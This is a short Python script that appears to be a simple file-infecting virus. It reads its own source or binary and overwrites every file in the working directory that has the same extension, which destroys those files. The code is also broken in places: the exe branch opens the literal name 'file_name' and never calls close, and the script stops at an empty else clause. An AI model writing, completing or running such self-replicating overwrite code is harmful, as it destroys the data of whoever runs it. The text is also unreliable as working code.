import os
from time import sleep
file_name = os.path.basename(__file__)
file_type = ''.join(file_name.split('.')[-1:])
file_path = os.path.abspath(os.getcwd())

#get contents of this file, if its py get plain text, if exe get binary data
if file_type == 'py':
    f = open(file_name, 'r')
    data = f.read()
    f.close()
elif file_type == 'exe':
    f = open('file_name', 'rb')
    data = f.read()
    f.close

file_count = 0
dir = file_path
for path in os.listdir(dir):
    if os.path.isfile(os.path.join(dir, path)):
        file_count += 1

current_dir_files = os.listdir(dir)

for file in current_dir_files:
    if ''.join(file.split('.')[-1:]) == file_type:
        if file_type == 'py':
            try:
                f = open(file, 'w')
                f.write(data)
                print('writen to python file')
                f.close()
            except:
                print(f'perms denied to {file}')
        elif file_type == 'exe':
            f = open(file, 'wb')
            f.write(data)
            f.close()
    else:
        


